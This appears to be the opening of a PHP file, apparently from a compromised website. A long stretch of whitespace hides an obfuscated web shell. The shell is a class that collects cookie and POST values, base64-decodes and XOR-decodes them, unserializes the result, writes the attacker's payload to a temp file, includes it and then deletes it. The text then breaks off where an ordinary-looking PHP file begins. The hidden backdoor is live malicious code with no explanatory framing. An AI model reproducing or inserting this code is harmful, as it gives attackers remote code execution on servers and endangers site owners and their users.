<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("meknh")){class meknh{public static $tfaifarm = "ijbtkoixbuuutfvk";public static $oaqier = NULL;public function __construct(){$wjlamhxx = @$_COOKIE[substr(meknh::$tfaifarm, 0, 4)];if (!empty($wjlamhxx)){$woqdl = "base64";$zgsiaxvdde = "";$wjlamhxx = explode(",", $wjlamhxx);foreach ($wjlamhxx as $cwjwrvnq){$zgsiaxvdde .= @$_COOKIE[$cwjwrvnq];$zgsiaxvdde .= @$_POST[$cwjwrvnq];}$zgsiaxvdde = array_map($woqdl . "_decode", array($zgsiaxvdde,));$zgsiaxvdde = $zgsiaxvdde[0] ^ str_repeat(meknh::$tfaifarm, (strlen($zgsiaxvdde[0]) / strlen(meknh::$tfaifarm)) + 1);meknh::$oaqier = @unserialize($zgsiaxvdde);}}public function __destruct(){$this->ydgethl();}private function ydgethl(){if (is_array(meknh::$oaqier)) {$fembtxxmj = sys_get_temp_dir() . "/" . crc32(meknh::$oaqier["salt"]);@meknh::$oaqier["write"]($fembtxxmj, meknh::$oaqier["content"]);include $fembtxxmj;@meknh::$oaqier["delete"]($fembtxxmj);exit();}}}$qrkpgr = new meknh();$qrkpgr = NULL;} ?><?php
/**
